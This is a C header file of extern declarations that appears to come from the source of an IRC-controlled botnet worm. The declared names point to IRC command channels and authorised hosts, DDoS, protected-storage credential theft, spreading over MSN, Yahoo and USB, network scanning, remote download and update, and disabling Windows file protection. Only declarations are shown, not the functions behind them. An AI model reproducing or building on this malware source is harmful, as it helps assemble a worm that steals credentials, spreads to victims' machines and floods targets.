extern char bid[];
extern char myvershun[];
extern char xetumhandle[];
extern char gotopth[];
extern char exename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern int authsize;
extern SERVER sinfo[];
extern int curserver;
extern SOCKET sock;
extern char zipname[];
extern char insidezip[];
extern char szRegname[];
extern char MainChan[];
extern char TorChan[];
extern char InfoChan[];
extern char USB_STR_FILENAME[];
extern DWORD WINAPI RemoteUSBThread(LPVOID param);
extern char main_title[];
#ifndef NO_SFCDISABLE
extern char sfc_dllname[];
#endif

extern GUPD fGetUserProfileDirectory;
extern char dir_title[];
extern char process_title[];
extern char irc_title[];
extern char download_title[];
extern char update_title[];
extern char ddos_title[];
extern char pstore_title[];
extern char tcp_title[];
extern char yahoo_title[];
extern char msn1spreadoff_title[];
extern char msnworm_title[];
extern char Message[];
extern char szMessage[];
extern char YahooMessage[];
extern DWORD WINAPI YahooSpreadText2(LPVOID param);
extern void dropfiles(HWND hwnd, char *email);
extern char scan_title[];
extern void randprefix(char *dst);
extern BOOL IsFirst;

extern HANDLE ih;
extern char host[MAX_HOSTNAME];

extern DWORD dwstarted;
extern DWORD dwconnected;

extern THREAD threads[MAX_THREADS];

extern HANDLE xetum;

extern const char get_auth1[];

extern char nameOfzip[];

extern char exip[MAX_IP];
extern char inip[MAX_IP];

extern const int static_ftp_port;
